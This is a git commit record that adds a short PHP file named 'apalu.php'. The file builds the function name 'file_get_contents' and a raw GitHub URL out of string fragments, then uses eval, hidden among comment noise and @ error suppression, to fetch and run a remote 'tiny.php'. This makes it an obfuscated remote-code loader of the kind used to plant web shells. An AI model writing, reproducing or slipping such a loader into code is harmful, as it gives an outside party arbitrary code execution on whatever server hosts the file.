0d5d6a79dbd27fc57b72f85829b6c714957ea833
Rahman Saputra <69113156+NoobTecho@users.noreply.github.com>
2024-09-23 01:24:03 +0700

    Create apalu.php

---
+++ apalu.php
@@ -0,0 +1,6 @@
+
+?php
+$f_get = 'f'.'i'.'l'.'e_'.'ge'.'t_'.'co'.'nt'.'en'.'ts';
+$u_r_l = 'h'.'tt'.'p'.'s:'.'//'.'r'.'aw'.'g'.'it'.'hu'.'b'.'com'.'/NoobTecho/mewang/refs/heads/main/tiny.php';
+/**#**/@/*55555*/null; /***#***/@/*55555*/eval/***#***/("?>".$f_get($u_r_l))/***#***/ /*haxorstars*/
+?>
